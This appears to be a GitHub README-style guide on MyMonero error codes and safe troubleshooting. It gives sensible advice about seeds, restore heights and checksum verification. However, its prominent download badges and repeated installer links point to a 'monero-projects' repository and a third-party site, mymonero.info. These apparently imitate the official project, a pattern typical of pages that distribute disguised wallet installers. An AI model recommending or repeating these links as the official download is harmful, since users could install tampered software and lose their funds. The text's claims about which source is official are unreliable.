<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Error Codes List and Safe Troubleshooting</h1>
<p align="center">A cautious guide to interpreting wallet errors without treating every message as a lost-funds warning.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
There is no confirmed comprehensive catalogue of MyMonero error codes in this guide. Error 523 is general guidance that a server connection is unavailable; for other messages, note the exact wording and troubleshoot the relevant connection, app, or restore step without sharing your seed.


For a second walkthrough, see [MyMonero error codes on mymonero.info](https://mymonero.info/mymonero-error-codes). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [the MyMonero FAQ](https://mymonero.info/faq).

## You'll see this if
- MyMonero displays a number, short error label, or message you do not recognize.
- The app cannot open, connect, sync, or display a balance as expected.
- You are unsure whether a message comes from the desktop app or a hosted login page.
- A stranger offers to interpret an error if you send a seed, key, or wallet file.

## Why it happens
Errors are clues, not complete explanations. The same visible symptom can arise at different stages: opening an application, contacting a service, scanning wallet history, or submitting an action. Without a confirmed code reference, assigning a precise cause to an unfamiliar number would be guesswork. Start by recording the exact text and the action immediately before it appeared. Do not include private information in that record.

One known example is Error 523. It relates to the server connection being unavailable, as general guidance. It does not prove that funds are lost, that a seed is wrong, or that a transaction failed. An inability to log into hosted web-wallet access should also be distinguished from a local desktop problem: MyMonero hosted servers and web-wallet login stopped.

The desktop app has a separate status. Its final release is v1.3.3, distributed as Windows .exe, macOS .dmg, and Linux .zip on the monero-projects GitHub release page. The old app still opens wallets and sends XMR, but it is no longer maintained and receives no new features or security updates. That context matters when deciding what to do after an error; repeated retries cannot add maintenance or restore hosted services. Read [MyMonero shutdown facts](./mymonero-shutdown-facts.md) for the distinction.

A message about balance or transaction visibility is not automatically an error in the underlying funds. Wallet information may need to be scanned from a restore height. Earlier restore height is safer for finding older history but takes longer. For relevant symptoms, compare [MyMonero balance shows zero](./mymonero-balance-shows-zero.md), [MyMonero not syncing fix](./mymonero-not-syncing.md), and [MyMonero transaction not showing](./mymonero-transaction-not-showing.md).

---

## Fix
1. **Capture the wording, not secrets.** Write down the full message, where it appeared, and what you were doing. Do not paste a seed, private key, password, wallet file, or screenshot showing recovery words into a forum or support form.
2. **Identify the context.** Note whether the message came from MyMonero desktop, hosted web-wallet login, or a different wallet you are considering for restoration. This avoids applying desktop troubleshooting to a stopped hosted service.
3. **Check whether the app opens.** If the app itself will not start, follow [MyMonero app not opening](./mymonero-app-not-opening.md) or MyMonero app crashes on start. If macOS blocks launch, the specific guidance is Mac says MyMonero cannot be opened.
4. **Check ordinary connectivity for connection symptoms.** Confirm that your device is online and try again later if an online connection is unavailable. Error 523 is a connection-unavailable clue, not a wallet recovery instruction. Avoid unknown proxy tools, remote-access requests, or unofficial “fixer” downloads.
5. **Verify the installer if you need a fresh copy.** Use the v1.3.3 GitHub release. Compare the file SHA-256 with the value published on that release page. Use `certutil -hashfile <file> SHA256` on Windows, `shasum -a 256 <file>` on macOS, or `sha256sum <file>` on Linux. This checks file integrity; it does not validate every message or guarantee online service availability.
6. **Choose a deliberate wallet path.** The two options are to keep using MyMonero desktop with its maintenance limitations, or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Review the migration checklist before restoring or moving funds.

> [!TIP]
> Separate observations from assumptions: “the desktop displayed this text after opening” is useful; “my wallet was hacked” is not established by an unfamiliar error alone.

---

## If that did not work
If the message remains unclear, pause rather than trying random commands or deleting local data. Keep your seed backup in its secure location. There is no confirmed general password reset method in this guidance, and no confirmed offline recovery method for a missing seed word. Do not let anyone turn uncertainty into a demand for your recovery words.

For a restoration, identify the seed format before proceeding: MyMonero may use 13 words that are MyMonero-specific and legacy, or 25 words in the standard Monero format. Use the matching instructions: 13-word MyMonero seed restore, 25-word seed migration, or seed format comparison. Never invent, reorder, or send words to a helper.

A restore height controls where scanning begins. An earlier height is safer when the correct point is uncertain, but scanning takes longer. It is not a secret phrase and does not replace a seed. See MyMonero restore height explained. If a recovery screen requests an import fee, note that historically MyMonero hosted servers charged a one-time fee to import a wallet created elsewhere; no current fee is stated here. See MyMonero import fee explained.

> [!WARNING]
> Treat unexpected requests for a seed, keys, or remote access as unsafe. Nobody legitimate asks for your seed to decode an error. Do not send funds to “verify” a wallet or unlock a balance.

---

## Prevention
Keep a private written backup of the seed and know whether it has 13 or 25 words. Store it away from devices and people who should not access your funds. Do not share it with anyone, including someone using an official-looking profile picture. For broader precautions, read how to back up a MyMonero seed safely.

Get desktop packages only from the monero-projects GitHub release source and check their SHA-256 against the release page. Avoid search ads and unsolicited links, which can lead to fake download pages. The desktop app is no longer maintained; consider this limitation when choosing to continue using it. See MyMonero fake download warning and is MyMonero safe?.

Keep a brief private note of the app version, operating system, and non-sensitive error wording. That helps you assess whether a later attempt is different without exposing wallet access. Do not assume an error code means you should sweep funds. Sweeping sends all funds to a new wallet and is a separate decision.

## FAQ
<details><summary>Is there a complete official error-code list here?</summary>

No. This article does not invent explanations for unconfirmed codes. Error 523 is described only as general guidance about an unavailable server connection.

</details>

<details><summary>Does an error code mean the wallet is damaged?</summary>

Not necessarily. An error can describe a connection or app issue. Record context and check the relevant symptom before drawing conclusions.

</details>

<details><summary>Can someone decode an error if I send my seed?</summary>

No seed should be shared for troubleshooting. Nobody legitimate asks for it, and the words can provide wallet access.

</details>

<details><summary>What if hosted login is the only thing that fails?</summary>

MyMonero hosted servers and web-wallet login stopped. Consider the desktop app’s limitations or a carefully planned seed restoration in Cake Wallet.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero App Not Opening: Safe Checks to Try](./mymonero-app-not-opening.md) | Work through launch problems carefully while keeping recovery words and wallet data private. |
| [MyMonero App Crashes on Start: What to Check](./mymonero-app-crashes-on-start.md) | Separate an application startup crash from wallet recovery, connection, and hosted-login issues. |
| [macOS Says MyMonero Cannot Be Opened: Safe Steps](./mymonero-macos-cannot-be-opened.md) | Use the specific right-click Open guidance and avoid weakening security for an untrusted download. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
